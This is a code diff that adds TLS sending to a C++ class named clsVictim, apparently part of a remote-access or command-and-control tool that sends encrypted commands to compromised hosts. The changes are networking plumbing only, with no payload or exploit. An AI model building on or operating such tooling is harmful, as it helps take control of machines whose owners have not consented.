@@ -7,6 +7,9 @@
 #include <string>
 #include <vector>
 
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
 #include "clsEDP.hpp"
 #include "clsTools.hpp"
 #include "clsEZData.hpp"
@@ -19,6 +22,7 @@ private:
 public:
     int m_nSkt;
     clsCrypto m_crypto;
+    SSL* m_ssl;
 
 public:
     clsVictim()
@@ -33,6 +37,11 @@ public:
     {
         m_nSkt = nSkt;
         m_crypto = crypto;
+    }
+    clsVictim(int nSkt, SSL* ssl)
+    {
+        m_nSkt = nSkt;
+        m_ssl = ssl;
     }
 
     ~clsVictim() = default;
@@ -67,9 +76,7 @@ public:
             }
             sent += static_cast<size_t>(n);
         }
-
-        // Use correct format for ssize_t
-        std::cout << "sent bytes: " << sent << std::endl;
+        
         return static_cast<ssize_t>(sent);
     }
 
@@ -98,11 +105,6 @@ public:
         return fnSend(2, 0, vuCipher);
     }
 
-    ssize_t fnSendEncryptedCommand(const std::string& szMsg)
-    {
-
-    }
-
     ssize_t fnSendCmdParam(uint8_t nCommand, uint8_t nParam, uint nLength = 10)
     {
         std::string szFoo = clsEZData::fnszGenerateRandomStr(nLength);
@@ -112,5 +114,15 @@ public:
         std::vector<unsigned char> vuData = edp.fnabGetBytes();
 
         return fnSendRAW(vuData);
+    }
+
+    ssize_t fnSslSend(std::string& szMsg)
+    {
+        BUFFER abBuffer(szMsg.begin(), szMsg.end());
+        return fnSslSend(abBuffer);
+    }
+    ssize_t fnSslSend(BUFFER& abBuffer)
+    {
+        return SSL_write(m_ssl, abBuffer.data(), abBuffer.size());
     }
 };
